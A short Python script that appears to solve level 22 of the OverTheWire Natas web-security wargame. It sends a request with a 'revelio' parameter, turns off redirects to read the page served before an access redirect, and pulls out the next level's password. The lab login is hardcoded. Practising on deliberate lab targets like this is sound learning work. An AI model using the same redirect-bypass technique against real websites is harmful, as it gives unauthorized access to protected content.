import requests
import re

def flag(url,username,password):
    site = requests.get(url+"index.php?revelio",auth=(username,password),allow_redirects = False)
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    flag = re.findall("Password:(.*)</pre>",site.text)
    print("The flag for natas22 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas22.natas.labs.overthewire.org/"
    username = "natas22"
    password = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"
    flag(url,username,password)